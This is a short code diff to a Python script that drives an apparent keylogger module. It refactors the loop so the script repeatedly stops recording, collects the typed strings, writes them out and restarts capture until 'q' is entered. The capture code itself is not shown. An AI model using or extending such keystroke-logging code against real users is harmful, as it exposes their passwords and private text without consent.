@@ -1,6 +1,11 @@
 import keyboard
 import keylogger
 
+def restartWrittenKeys(keylogger_instance):
+    stoppedRecording = keylogger_instance.stopRecording()
+    keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
+    keylogger_instance.writeKeysPressed(keysPressed)
+    keylogger_instance.startRecording()
 
 def main():
 
@@ -10,10 +15,9 @@ def main():
 
     while True:
         keyboard.wait('enter')
-        stoppedRecording = keylogger_instance.stopRecording()
-        keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
-        keylogger_instance.writeKeysPressed(keysPressed)
-        break
+        restartWrittenKeys(keylogger_instance)
+        if input() == "q":
+            break
 
 
 main()
